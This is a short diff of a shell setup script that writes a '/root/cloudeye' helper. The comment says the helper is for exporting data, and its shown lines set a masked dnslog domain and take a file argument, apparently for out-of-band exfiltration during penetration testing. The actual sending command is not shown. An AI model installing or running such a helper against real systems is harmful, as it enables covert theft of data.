@@ -16,7 +16,7 @@ echo 'source edited!'
 
 #add cloudeye support to export data
 touch /root/cloudeye
-cat > /root/cloudeye <<EOF
+cat >> /root/cloudeye <<EOF
 #!/bin/bash
 domain='http://xxx.xxxxxx.dnslog.info'
 file=$1
